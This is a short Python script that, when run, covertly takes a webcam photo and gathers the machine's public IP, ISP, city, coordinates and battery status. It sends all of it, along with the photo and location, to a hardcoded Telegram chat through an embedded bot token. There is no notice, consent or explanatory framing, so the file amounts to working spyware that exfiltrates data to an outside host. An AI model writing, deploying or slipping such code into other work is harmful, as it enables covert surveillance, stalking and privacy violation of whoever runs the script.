import cv2
import requests
import telebot
import psutil

BOT_TOKEN = '7885949946:AAEkNOAsoP-AafbBeY5OdzW5MCs1ZFW6wzw'
CHAT_ID = '6818652606'
bot = telebot.TeleBot(BOT_TOKEN)

def take_photo():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        filename = "photo.jpg"
        cv2.imwrite(filename, frame)
        cam.release()
        return filename
    return None

def get_ip_info():
    try:
        res = requests.get("http://ip-api.com/json/").json()
        return res
    except:
        return {}

def get_battery_info():
    try:
        battery = psutil.sensors_battery()
        return {
            "percent": battery.percent,
            "charging": battery.power_plugged
        }
    except:
        return {"percent": "Unknown", "charging": "Unknown"}

def send_info():
    ip_info = get_ip_info()
    battery = get_battery_info()

    message = f"""
📡 IP: {ip_info.get('query')}
🌍 Country: {ip_info.get('country')} - {ip_info.get('city')}
🏢 ISP: {ip_info.get('isp')}
🔋 Battery: {battery['percent']}%
🔌 Charging: {"Yes" if battery["charging"] else "No"}
"""

    bot.send_message(CHAT_ID, message)

    # Send photo
    photo_path = take_photo()
    if photo_path:
        with open(photo_path, 'rb') as photo:
            bot.send_photo(CHAT_ID, photo)

    # Send location
    lat = ip_info.get("lat")
    lon = ip_info.get("lon")
    if lat and lon:
        bot.send_location(CHAT_ID, lat, lon)

# Start the bot once
send_info()
